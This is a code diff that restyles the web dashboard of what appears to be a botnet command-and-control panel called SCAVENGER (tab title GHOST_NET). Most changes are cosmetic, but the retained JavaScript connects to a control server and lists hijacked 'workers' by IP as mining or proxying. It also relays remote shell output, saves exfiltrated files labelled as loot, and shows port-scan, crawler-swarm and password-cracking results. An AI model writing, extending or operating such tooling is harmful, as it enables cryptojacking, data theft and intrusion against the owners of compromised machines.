@@ -1,32 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    
     <title>SCAVENGER </title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-<link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
-<link rel="shortcut icon" type="image/png" href="/assets/favicon.png">
-<link rel="apple-touch-icon" href="/assets/favicon.png">
+    <link rel="icon" type="image/png" href="favicon.png">
     <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
-
     <style>
-
         :root {
-            --bg-color: #1a1a1a;
+            /* --- THEME CONFIG: GHOST BLUE --- */
+            --bg-color: #050a10;       /* Very dark blue-black */
             --win-bg: #000000;
-            --border-light: #555;
-            --header-bg: #000080;
-            --header-text: #fff;
-            --text-main: #e0e0e0;
-            --accent: #ffb000;
+            --border-light: #005f73;   /* Muted teal border */
+            --header-bg: #003366;      /* Deep blue header */
+            --header-text: #e0f7fa;    /* Icy white text */
+            --text-main: #b3e5fc;      /* Soft blue text */
+            --accent: #00e5ff;         /* BRIGHT CYAN (Matches your Logo) */
+            
+            /* Status Colors */
+            --alert: #ff3333;          /* Red stays Red */
+            --success: #00ff41;        /* Green stays Green */
         }
+
         body { 
             background-color: var(--bg-color);
+            /* subtle blue grid */
             background-image: 
-                linear-gradient(var(--border-light) 1px, transparent 1px),
-                linear-gradient(90deg, var(--border-light) 1px, transparent 1px);
+                linear-gradient(rgba(0, 229, 255, 0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 229, 255, 0.1) 1px, transparent 1px);
             background-size: 20px 20px;
             font-family: 'VT323', monospace;
             font-size: 20px;
@@ -36,39 +36,87 @@
             box-sizing: border-box;
             display: flex; flex-direction: column; gap: 10px;
             overflow: hidden;
+            text-shadow: 0 0 2px rgba(0, 229, 255, 0.3); /* Slight glow */
         }
-        .win-frame { border: 2px solid var(--border-light); background: var(--win-bg); box-shadow: 4px 4px 0px #000; display: flex; flex-direction: column; min-height: 0; }
-        .title-bar { background: var(--header-bg); color: var(--header-text); padding: 4px 8px; font-size: 22px; text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--border-light); flex-shrink: 0; }
+
+        .win-frame { 
+            border: 2px solid var(--border-light); 
+            background: var(--win-bg); 
+            box-shadow: 4px 4px 0px #001122; /* Dark blue shadow */
+            display: flex; flex-direction: column; min-height: 0; 
+        }
+
+        .title-bar { 
+            background: var(--header-bg); 
+            color: var(--header-text); 
+            padding: 4px 8px; 
+            font-size: 22px; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            display: flex; justify-content: space-between; align-items: center; 
+            border-bottom: 2px solid var(--border-light); 
+            flex-shrink: 0; 
+        }
+
         .win-content { padding: 5px; overflow: hidden; display: flex; flex-direction: column; flex-grow: 1; position: relative; }
+        
         .top-deck { display: flex; flex-direction: column; gap: 10px; flex-grow: 1; overflow: hidden; }
         @media (min-width: 768px) { .top-deck { flex-direction: row; } #win-logs { flex: 2; } #win-stats { flex: 1; } }
         #win-logs { flex: 2; } #win-stats { flex: 1; }
+        
         table { width: 100%; border-collapse: collapse; font-size: 18px; }
         th { text-align: left; border-bottom: 1px dashed var(--border-light); color: var(--accent); font-weight: normal; }
         td { padding: 2px 0; }
-        .row-mining { color: #fff; } .row-proxy { color: #d400ff; } .row-idle { color: #555; }
+        
+        .row-mining { color: #fff; } 
+        .row-proxy { color: #d400ff; } 
+        .row-idle { color: #555; }
+        
         .stat-grid { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
-        .big-stat { font-size: 32px; color: var(--accent); line-height: 1; }
-        .stat-label { color: #888; font-size: 16px; }
-        #log-window { overflow-y: scroll; height: 100%; background: #050505; font-size: 18px; }
-        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #111; word-wrap: break-word; }
-        .cmd-frame { background: #000; border: 2px solid var(--border-light); padding: 8px; display: flex; align-items: center; box-shadow: 4px 4px 0px #000; flex-shrink: 0; }
-        input { background: transparent; border: none; color: var(--accent); font-family: 'VT323', monospace; font-size: 22px; width: 100%; outline: none; text-transform: uppercase; }
+        .big-stat { font-size: 32px; color: var(--accent); line-height: 1; text-shadow: 0 0 5px var(--accent); }
+        .stat-label { color: #578aab; font-size: 16px; }
+        
+        #log-window { overflow-y: scroll; height: 100%; background: #020408; font-size: 18px; }
+        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #112233; word-wrap: break-word; }
+        
+        .cmd-frame { 
+            background: #000; 
+            border: 2px solid var(--border-light); 
+            padding: 8px; 
+            display: flex; align-items: center; 
+            box-shadow: 4px 4px 0px #001122; 
+            flex-shrink: 0; 
+        }
+        
+        input { 
+            background: transparent; 
+            border: none; 
+            color: var(--accent); 
+            font-family: 'VT323', monospace; 
+            font-size: 22px; 
+            width: 100%; 
+            outline: none; 
+            text-transform: uppercase; 
+        }
+        
+        /* Custom Scrollbar for the Blue Theme */
+        ::-webkit-scrollbar { width: 8px; background: #000; }
+        ::-webkit-scrollbar-thumb { background: var(--border-light); }
     </style>
 </head>
 <body>
 
     <div class="top-deck">
         <div class="win-frame" id="win-logs">
-            <div class="title-bar"><span>// LOGS</span><span>X</span></div>
+            <div class="title-bar"><span>// SYSTEM_LOGS</span><span>X</span></div>
             <div class="win-content"><div id="log-window"></div></div>
         </div>
         <div class="win-frame" id="win-stats">
-            <div class="title-bar"><span>// GRID</span><span>_</span></div>
+            <div class="title-bar"><span>// NETWORK_GRID</span><span>_</span></div>
             <div class="win-content">
                 <div class="stat-grid">
                     <div><div class="stat-label">HASH/S</div><div id="hashCount" class="big-stat">0.00</div></div>
-                    <div><div class="stat-label">STATUS</div><div id="percText" style="color:var(--accent); font-size: 22px;">ACTIVE</div></div>
+                    <div><div class="stat-label">STATUS</div><div id="percText" style="color:var(--accent); font-size: 22px;">ONLINE</div></div>
                 </div>
                 <div style="flex-grow: 1; overflow-y: auto; border-top: 1px solid var(--border-light);">
                     <table><thead><tr><th>ID</th><th>IP</th><th>ACT</th></tr></thead><tbody id="workerTable"></tbody></table>
@@ -90,15 +138,15 @@
             let key = localStorage.getItem('access_key');
             if (!key) { key = prompt("SECURE TERMINAL // ENTER KEY:"); if (key) localStorage.setItem('access_key', key); }
             ws = new WebSocket(wsUrl + '?key=' + key);
-            ws.onopen = () => { log("UPLINK SECURED.", "#0f0"); ws.send(JSON.stringify({ type: 'REGISTER_CLIENT' })); };
-            ws.onclose = () => { log("SIGNAL LOST. RETRYING...", "#f00"); setTimeout(connect, 3000); };
+            ws.onopen = () => { log("UPLINK SECURED.", "#00ff41"); ws.send(JSON.stringify({ type: 'REGISTER_CLIENT' })); };
+            ws.onclose = () => { log("SIGNAL LOST. RETRYING...", "#ff3333"); setTimeout(connect, 3000); };
             ws.onmessage = (event) => {
                 const data = JSON.parse(event.data);
                 if(data.type === 'STATS') updateDashboard(data);
                 if(data.type === 'PROXY_LOG') log(`[PROXY] ${data.data.status} > ${data.data.url}`, "#d400ff");
                 if(data.type === 'SHELL_LOG') logHTML(data.output);
-                if(data.type === 'EXFIL_RECEIVE') { log(`[LOOT] SAVED: ${data.filename}`, "#0f0"); downloadFile(data.filename, data.data); }
-                if(data.type === 'SNIPE_LOG') { log(`[ALPHA] ${data.data.ticker} >> ${data.data.mentions}`, "#ffb000"); }
+                if(data.type === 'EXFIL_RECEIVE') { log(`[LOOT] SAVED: ${data.filename}`, "#00ff41"); downloadFile(data.filename, data.data); }
+                if(data.type === 'SNIPE_LOG') { log(`[ALPHA] ${data.data.ticker} >> ${data.data.mentions}`, "#00e5ff"); }
                 if(data.type === 'MAP_LOG') handleMapLog(data.data);
                 if(data.type === 'SCAN_LOG') handleScanLog(data.data);
                 if(data.type === 'SPIDER_SCOUT_LOG') handleSpiderScout(data.data);
@@ -108,16 +156,17 @@
 
         function updateDashboard(data) {
             document.getElementById('hashCount').innerText = (data.totalHashes / 1000000).toFixed(2);
+            document.title = `GHOST_NET // [${data.workers.length}]`; // Tab Title Update
             const tbody = document.getElementById('workerTable'); tbody.innerHTML = '';
             data.workers.forEach(w => {
                 const row = document.createElement('tr');
                 let cls = 'row-mining';
                 if (w.role === 'PROXYING') cls = 'row-proxy';
                 if (w.role === 'IDLE') cls = 'row-idle';
-                row.innerHTML = `<td style="color:#888">${w.id}</td><td>${w.ip}</td><td class="${cls}">${w.role}</td>`;
+                row.innerHTML = `<td style="color:#578aab">${w.id}</td><td>${w.ip}</td><td class="${cls}">${w.role}</td>`;
                 tbody.appendChild(row);
             });
-            if (data.goldenTicket) { document.getElementById('percText').innerText = "CRACKED: " + data.goldenTicket; document.getElementById('percText').style.color = "#0f0"; }
+            if (data.goldenTicket) { document.getElementById('percText').innerText = "CRACKED: " + data.goldenTicket; document.getElementById('percText').style.color = "#00ff41"; }
         }
 
         document.getElementById('cmdInput').addEventListener('keypress', function (e) {
@@ -139,19 +188,19 @@
             const link = document.createElement('a'); link.href = `data:application/octet-stream;base64,${base64}`;
             link.download = filename; document.body.appendChild(link); link.click(); document.body.removeChild(link);
         }
-        function log(msg, color = "#fff") {
+        function log(msg, color = "#e0f7fa") {
             const line = document.createElement('div'); line.className = 'log-entry';
             const time = new Date().toLocaleTimeString('en-US', { hour12: false });
-            line.innerHTML = `<span style="color:#555">[${time}]</span> <span style="color:${color}">${msg}</span>`;
+            line.innerHTML = `<span style="color:#578aab">[${time}]</span> <span style="color:${color}">${msg}</span>`;
             logDiv.appendChild(line); logDiv.scrollTop = logDiv.scrollHeight;
         }
         function logHTML(html) { log(html.replace(/\n/g, "<br>")); }
-        function handleMapLog(res) { log(`[MAP] ${res.status} > /${res.path}`, res.status === 200 ? "#0f0" : "#d400ff"); }
-        function handleScanLog(res) { log(`[HYDRA] PORT ${res.port} OPEN ON ${res.ip}`, "#f00"); }
+        function handleMapLog(res) { log(`[MAP] ${res.status} > /${res.path}`, res.status === 200 ? "#00ff41" : "#d400ff"); }
+        function handleScanLog(res) { log(`[HYDRA] PORT ${res.port} OPEN ON ${res.ip}`, "#ff3333"); }
         
         function handleSpiderScout(data) {
             const links = data.links;
-            log(`[SPIDER] Scout found ${links.length} links. Deploying Swarm...`, "#06b6d4");
+            log(`[SPIDER] Scout found ${links.length} links. Deploying Swarm...`, "#00e5ff");
             links.forEach((link, index) => { setTimeout(() => { ws.send(JSON.stringify({ type: 'SEND_SPIDER_AUDIT', url: link })); }, index * 50); });
         }
         function handleSpiderAudit(res) {
